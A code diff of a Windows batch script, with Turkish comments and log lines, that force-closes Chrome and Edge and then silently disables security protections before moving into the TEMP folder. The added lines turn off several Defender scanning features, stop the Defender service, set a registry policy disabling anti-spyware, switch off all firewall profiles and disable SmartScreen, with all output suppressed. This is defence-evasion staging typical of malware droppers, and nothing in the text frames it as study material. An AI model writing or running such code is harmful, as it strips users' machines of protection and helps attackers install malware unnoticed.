@@ -10,11 +10,20 @@ echo [%DATE% %TIME%] Tarayıcılar kapatılıyor... >> "%LOGFILE%"
 taskkill /F /IM chrome.exe >nul 2>&1
 taskkill /F /IM msedge.exe >nul 2>&1
 
-:: Defender kapatma (yönetici izni gerekir)
-echo [%DATE% %TIME%] Defender kapatılıyor... >> "%LOGFILE%"
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
+:: Windows Defender kapatma (yönetici izni gerekir)
+echo [%DATE% %TIME%] Windows Defender kapatılıyor... >> "%LOGFILE%"
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true" >nul 2>&1
 powershell -Command "Stop-Service -Name WinDefend -Force" >nul 2>&1
+powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force" >nul 2>&1
+
+:: Windows Firewall kapatma
+echo [%DATE% %TIME%] Windows Firewall kapatılıyor... >> "%LOGFILE%"
 powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" >nul 2>&1
+
+:: Windows SmartScreen kapatma
+echo [%DATE% %TIME%] Windows SmartScreen kapatılıyor... >> "%LOGFILE%"
+powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0 -Type DWord -Force" >nul 2>&1
+powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off' -Type String -Force" >nul 2>&1
 
 cd /d %TEMP%
 echo [%DATE% %TIME%] Çalışma dizini: %CD% >> "%LOGFILE%"
